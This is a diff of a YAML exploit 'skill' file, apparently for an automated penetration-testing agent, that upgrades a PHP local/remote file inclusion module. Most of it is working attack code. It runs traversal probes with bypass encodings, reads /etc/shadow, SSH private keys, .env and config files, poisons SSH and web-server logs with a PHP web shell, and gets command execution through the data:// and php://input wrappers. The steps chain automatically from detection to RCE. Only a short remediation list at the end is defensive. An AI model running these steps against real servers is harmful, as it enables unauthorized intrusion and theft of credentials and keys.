@@ -1,13 +1,15 @@
 skill_id: lfi_rfi_exploit
 name: "本地/远程文件包含 (LFI/RFI)"
 category: web_rce
-version: "1.0"
+version: "2.0"
 
 principle: |
   文件包含漏洞允许攻击者读取服务器文件或执行代码。
   攻击链: LFI读取敏感文件 → 日志注入(SSH/Apache) → 包含日志文件 → RCE。
-  PHP filter 链可直接读取源码: php://filter/convert.base64-encode/resource=
-  常见参数: page, file, include, path, doc, folder, view, content, template
+  关键: 不同应用目录深度不同，必须遍历 1-10 级 ../ 才能确保命中。
+  PHP wrappers 可直接 RCE: php://input + POST、data:// 协议。
+  PHP filter 链可读源码: php://filter/convert.base64-encode/resource=
+  常见参数: page, file, include, path, doc, folder, view, content, template, image
 
 match:
   rules:
@@ -23,97 +25,308 @@ match:
 
 probes:
   - id: detect_lfi
-    description: "探测常见 LFI 参数"
+    description: "多深度遍历探测 LFI 参数（1-10 级 ../）"
     command: |
       BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-      echo "=== LFI Probe ==="
-      for param in page file include path doc folder view content template; do
-        result=$(curl -s "$BASE/?$param=../../../../../etc/passwd" --max-time 8 2>/dev/null)
+      echo "=== LFI Multi-Depth Probe ==="
+
+      try_lfi() {
+        local url="$1"
+        local result
+        result=$(curl -s "$url" --max-time 6 2>/dev/null)
         if echo "$result" | grep -q "root:x:0"; then
-          echo "LFI_FOUND:$param"
           echo "$result" | head -5
-          exit 0
+          return 0
         fi
+        return 1
+      }
+
+      for depth in 1 2 3 4 5 6 7 8 9 10; do
+        TRAV=$(printf '../%.0s' $(seq 1 $depth))
+        for param in page file include path doc folder view content template image; do
+          if try_lfi "$BASE/?$param=${TRAV}etc/passwd"; then
+            echo "LFI_FOUND:$param:$depth"
+            exit 0
+          fi
+        done
       done
-      # 尝试已知路径
-      for path in "/antibot_image/antibots/info.php?image=" "/index.php?page=" "/include.php?file="; do
-        result=$(curl -s "$BASE$path../../../../../etc/passwd" --max-time 8 2>/dev/null)
-        if echo "$result" | grep -q "root:x:0"; then
-          echo "LFI_PATH_FOUND:$path"
-          echo "$result" | head -5
-          exit 0
-        fi
+
+      for depth in 1 2 3 4 5 6 7 8 9 10; do
+        TRAV=$(printf '../%.0s' $(seq 1 $depth))
+        for kpath in "/antibot_image/antibots/info.php?image=" "/index.php?page=" "/include.php?file=" "/view.php?file=" "/display.php?path="; do
+          if try_lfi "$BASE${kpath}${TRAV}etc/passwd"; then
+            echo "LFI_PATH_FOUND:$kpath:$depth"
+            exit 0
+          fi
+        done
       done
+
+      for depth in 1 2 3 4 5 6 7 8 9 10; do
+        TRAV=$(printf '../%.0s' $(seq 1 $depth))
+        for param in page file include path image; do
+          for bypass in "%00" "....//....//....//etc/passwd" "..%252f"; do
+            if try_lfi "$BASE/?$param=${TRAV}etc/passwd${bypass}"; then
+              echo "LFI_BYPASS_FOUND:$param:$depth:$bypass"
+              exit 0
+            fi
+          done
+        done
+      done
+
       echo "LFI_NOT_FOUND"
-    timeout: 60
+    timeout: 120
     parse_rules:
       - if_contains: ["LFI_FOUND"]
         set: { lfi_confirmed: true, lfi_type: "param" }
       - if_contains: ["LFI_PATH_FOUND"]
         set: { lfi_confirmed: true, lfi_type: "path" }
+      - if_contains: ["LFI_BYPASS_FOUND"]
+        set: { lfi_confirmed: true, lfi_type: "bypass" }
+
+  - id: enumerate_files
+    description: "利用已确认的 LFI 读取高价值文件（密码、日志、密钥、配置）"
+    depends_on: { lfi_confirmed: true }
+    command: |
+      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+      echo "=== LFI File Enumeration ==="
+
+      LFI_PARAM="page"
+      LFI_DEPTH=5
+
+      TARGETS="/etc/shadow
+      /etc/hosts
+      /etc/hostname
+      /proc/self/environ
+      /proc/self/cmdline
+      /proc/version
+      /var/log/auth.log
+      /var/log/apache2/access.log
+      /var/log/apache2/error.log
+      /var/log/nginx/access.log
+      /var/log/nginx/error.log
+      /root/.ssh/id_rsa
+      /root/.ssh/authorized_keys
+      /root/.bash_history
+      /home/www-data/.ssh/id_rsa
+      /etc/apache2/sites-enabled/000-default.conf
+      /etc/nginx/sites-enabled/default
+      /var/www/html/.htpasswd
+      /var/www/html/config.php
+      /var/www/html/wp-config.php
+      /var/www/html/.env"
+
+      TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+      READABLE=""
+      for f in $TARGETS; do
+        result=$(curl -s "$BASE/?$LFI_PARAM=${TRAV}${f}" --max-time 6 2>/dev/null)
+        size=${#result}
+        if [ "$size" -gt 10 ] && ! echo "$result" | grep -qi "not found\|no such\|failed to open\|warning.*include"; then
+          echo "READABLE:$f ($size bytes)"
+          echo "$result" | head -8
+          echo "---"
+          READABLE="$READABLE $f"
+        fi
+      done
+
+      PASSWD=$(curl -s "$BASE/?$LFI_PARAM=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
+      USERS=$(echo "$PASSWD" | grep -E ":/home/" | cut -d: -f1)
+      for user in $USERS; do
+        for keyfile in ".ssh/id_rsa" ".ssh/authorized_keys" ".bash_history"; do
+          result=$(curl -s "$BASE/?$LFI_PARAM=${TRAV}home/$user/$keyfile" --max-time 6 2>/dev/null)
+          if [ ${#result} -gt 20 ] && ! echo "$result" | grep -qi "not found\|no such\|failed"; then
+            echo "USER_FILE_READABLE:/home/$user/$keyfile"
+            echo "$result" | head -10
+            echo "---"
+          fi
+        done
+      done
+
+      [ -n "$READABLE" ] && echo "LFI_ENUM_OK" || echo "LFI_ENUM_EMPTY"
+    timeout: 90
+    parse_rules:
+      - if_contains: ["READABLE:/var/log/auth.log"]
+        set: { auth_log_readable: true }
+      - if_contains: ["READABLE:/var/log/apache2/access.log"]
+        set: { apache_log_readable: true }
+      - if_contains: ["READABLE:/var/log/nginx/access.log"]
+        set: { nginx_log_readable: true }
+      - if_contains: ["USER_FILE_READABLE"]
+        set: { user_files_found: true }
+      - if_contains: ["READABLE:/proc/self/environ"]
+        set: { proc_environ_readable: true }
+      - if_contains: ["READABLE:/etc/shadow"]
+        set: { shadow_readable: true }
+      - if_contains: ["BEGIN RSA PRIVATE KEY", "BEGIN OPENSSH PRIVATE KEY"]
+        set: { ssh_key_found: true }
 
   - id: check_ssh_port
     description: "检查 SSH 端口（用于日志注入）"
     depends_on: { lfi_confirmed: true }
     command: |
-      nmap -sT -p 22,2211,2222 --open {TARGET_IP} 2>/dev/null | grep "open" || echo "NO_SSH"
+      nmap -sT -p 22,2211,2222,2022,22222 --open {TARGET_IP} 2>/dev/null | grep "open" || echo "NO_SSH"
     timeout: 15
     parse_rules:
       - if_regex: "\\d+/tcp\\s+open\\s+ssh"
         set: { ssh_available: true }
 
 exploit_paths:
-  - path_id: lfi_etc_passwd
-    name: "LFI 读取敏感文件"
+  - path_id: lfi_wrapper_rce
+    name: "PHP Wrapper 直接 RCE（data:// / php://input）"
     priority: 1
     conditions:
       lfi_confirmed: true
     steps:
-      - id: read_passwd
-        description: "读取 /etc/passwd 确认 LFI"
+      - id: try_data_wrapper
+        description: "data:// wrapper 执行系统命令"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          result=$(curl -s "$BASE/?page=../../../../../etc/passwd" --max-time 10 2>/dev/null)
-          echo "$result"
-          echo "$result" | grep -q "root:x:0" && echo "LFI_PASSWD_OK"
-        timeout: 15
-        success_criteria:
-          stdout_contains_any: ["root:x:0", "LFI_PASSWD_OK"]
-        on_success: try_log_poison
-        on_fail: next_path
-        evidence_capture:
-          shell_type: "file_read"
-
-      - id: try_log_poison
-        description: "SSH 日志注入 + LFI 包含实现 RCE"
-        command: |
-          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          echo "=== Log Poisoning via SSH ==="
-          # 注入 PHP 代码到 SSH auth.log
-          sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
-            '<?php system($_GET["cmd"]);?>'@{TARGET_IP} 2>&1 || true
-          sleep 2
-          # 尝试包含 auth.log 并执行命令
-          for logpath in /var/log/auth.log /var/log/secure /var/log/sshd.log; do
-            result=$(curl -s "$BASE/?page=../../../../../$logpath&cmd=id" --max-time 10 2>/dev/null)
+          echo "=== PHP data:// Wrapper RCE ==="
+          for param in page file include path image content template; do
+            result=$(curl -s "$BASE/?$param=data://text/plain,<?php%20system('id');?>" --max-time 8 2>/dev/null)
             if echo "$result" | grep -q "uid="; then
-              echo "LOG_POISON_RCE"
+              echo "DATA_WRAPPER_RCE:$param"
+              echo "$result" | grep "uid="
+              exit 0
+            fi
+            result=$(curl -s "$BASE/?$param=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==" --max-time 8 2>/dev/null)
+            if echo "$result" | grep -q "uid="; then
+              echo "DATA_WRAPPER_B64_RCE:$param"
               echo "$result" | grep "uid="
               exit 0
             fi
           done
-          echo "LOG_POISON_FAILED"
-        timeout: 30
+          echo "DATA_WRAPPER_FAILED"
+        timeout: 60
         success_criteria:
-          stdout_contains_any: ["uid=", "LOG_POISON_RCE"]
+          stdout_contains_any: ["uid=", "DATA_WRAPPER_RCE", "DATA_WRAPPER_B64_RCE"]
+        on_success: conclude_success
+        on_fail: try_input_wrapper
+        evidence_capture:
+          shell_type: "rce_data_wrapper"
+
+      - id: try_input_wrapper
+        description: "php://input POST 方式执行系统命令"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== PHP php://input Wrapper RCE ==="
+          for param in page file include path image content template; do
+            result=$(curl -s "$BASE/?$param=php://input" -d '<?php system("id"); ?>' --max-time 8 2>/dev/null)
+            if echo "$result" | grep -q "uid="; then
+              echo "INPUT_WRAPPER_RCE:$param"
+              echo "$result" | grep "uid="
+              exit 0
+            fi
+          done
+          echo "INPUT_WRAPPER_FAILED"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["uid=", "INPUT_WRAPPER_RCE"]
         on_success: conclude_success
         on_fail: next_path
         evidence_capture:
-          shell_type: "rce_log_poison"
+          shell_type: "rce_input_wrapper"
+
+  - path_id: lfi_log_poison
+    name: "日志注入 RCE（SSH auth.log + Apache/Nginx access.log）"
+    priority: 2
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: log_poison_ssh
+        description: "SSH 日志注入 + 多深度 LFI 包含 auth.log"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== SSH Log Poisoning ==="
+          sshpass -p "x" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
+            '<?php system($_GET["cmd"]);?>'@{TARGET_IP} 2>&1 || true
+          sleep 2
+
+          for depth in 3 4 5 6 7 8 9 10; do
+            TRAV=$(printf '../%.0s' $(seq 1 $depth))
+            for logpath in var/log/auth.log var/log/secure var/log/sshd.log; do
+              for param in page file include path image content template; do
+                result=$(curl -s "$BASE/?$param=${TRAV}${logpath}&cmd=id" --max-time 8 2>/dev/null)
+                if echo "$result" | grep -q "uid="; then
+                  echo "SSH_LOG_POISON_RCE:$param:$depth:$logpath"
+                  echo "$result" | grep "uid="
+                  exit 0
+                fi
+              done
+            done
+          done
+          echo "SSH_LOG_POISON_FAILED"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["uid=", "SSH_LOG_POISON_RCE"]
+        on_success: conclude_success
+        on_fail: log_poison_apache
+        evidence_capture:
+          shell_type: "rce_ssh_log_poison"
+
+      - id: log_poison_apache
+        description: "Apache/Nginx User-Agent 日志注入 + LFI 包含"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== Apache/Nginx User-Agent Log Poisoning ==="
+          curl -s "$BASE/" -H 'User-Agent: <?php system($_GET["cmd"]);?>' --max-time 5 >/dev/null 2>&1 || true
+          sleep 1
+
+          LOGS="var/log/apache2/access.log var/log/apache2/error.log var/log/nginx/access.log var/log/nginx/error.log var/log/httpd/access_log var/log/httpd/error_log"
+          for depth in 3 4 5 6 7 8 9 10; do
+            TRAV=$(printf '../%.0s' $(seq 1 $depth))
+            for logpath in $LOGS; do
+              for param in page file include path image content template; do
+                result=$(curl -s "$BASE/?$param=${TRAV}${logpath}&cmd=id" --max-time 8 2>/dev/null)
+                if echo "$result" | grep -q "uid="; then
+                  echo "APACHE_LOG_POISON_RCE:$param:$depth:$logpath"
+                  echo "$result" | grep "uid="
+                  exit 0
+                fi
+              done
+            done
+          done
+          echo "APACHE_LOG_POISON_FAILED"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["uid=", "APACHE_LOG_POISON_RCE"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "rce_apache_log_poison"
+
+  - path_id: lfi_sensitive_read
+    name: "LFI 敏感文件读取（/etc/passwd + 高价值文件）"
+    priority: 3
+    conditions:
+      lfi_confirmed: true
+    steps:
+      - id: read_passwd_confirm
+        description: "多深度读取 /etc/passwd 确认 LFI"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          for depth in 1 2 3 4 5 6 7 8 9 10; do
+            TRAV=$(printf '../%.0s' $(seq 1 $depth))
+            for param in page file include path image content template; do
+              result=$(curl -s "$BASE/?$param=${TRAV}etc/passwd" --max-time 6 2>/dev/null)
+              if echo "$result" | grep -q "root:x:0"; then
+                echo "LFI_PASSWD_OK:$param:$depth"
+                echo "$result"
+                exit 0
+              fi
+            done
+          done
+          echo "LFI_PASSWD_FAILED"
+        timeout: 60
+        success_criteria:
+          stdout_contains_any: ["root:x:0", "LFI_PASSWD_OK"]
+        on_success: conclude_success
+        on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read"
 
   - path_id: php_filter_chain
     name: "PHP Filter 链源码读取"
-    priority: 2
+    priority: 4
     conditions:
       lfi_confirmed: true
     steps:
@@ -122,14 +335,16 @@ exploit_paths:
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           echo "=== PHP Filter Chain ==="
-          result=$(curl -s "$BASE/?page=php://filter/convert.base64-encode/resource=index" --max-time 10 2>/dev/null)
-          if [ ${#result} -gt 20 ]; then
-            echo "PHP_FILTER_OK"
-            echo "$result" | base64 -d 2>/dev/null | head -30
-          else
-            echo "PHP_FILTER_FAILED"
-          fi
-        timeout: 15
+          for param in page file include path image content template; do
+            result=$(curl -s "$BASE/?$param=php://filter/convert.base64-encode/resource=index" --max-time 10 2>/dev/null)
+            if [ ${#result} -gt 20 ]; then
+              echo "PHP_FILTER_OK:$param"
+              echo "$result" | base64 -d 2>/dev/null | head -30
+              exit 0
+            fi
+          done
+          echo "PHP_FILTER_FAILED"
+        timeout: 30
         success_criteria:
           stdout_contains_any: ["PHP_FILTER_OK", "<?php"]
         on_success: conclude_success
@@ -148,3 +363,4 @@ remediation: |
   2. 使用白名单限制可包含的文件
   3. 设置 open_basedir 限制文件访问范围
   4. 关闭 allow_url_include
+  5. 关闭 allow_url_fopen（阻止 data:// / php://input 利用）
